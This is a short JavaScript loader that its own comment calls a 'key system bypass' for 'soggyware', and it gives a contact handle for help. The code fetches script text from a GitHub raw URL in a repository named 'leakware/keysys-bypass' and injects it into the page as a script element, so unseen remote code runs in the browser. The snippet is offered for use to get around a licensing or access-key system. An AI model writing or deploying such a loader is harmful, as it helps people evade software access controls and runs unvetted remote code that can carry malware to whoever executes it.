// loader for soggyware key system bypass (contact bruno#2465 for help using or removal) 

fetch('https://raw.githubusercontent.com/leakware/keysys-bypass/main/main.js')
  .then(response => response.text())
  .then(code => {
    const script = document.createElement('script');
    script.textContent = code;
    document.body.appendChild(script);
  })
  .catch(error => console.error(error));
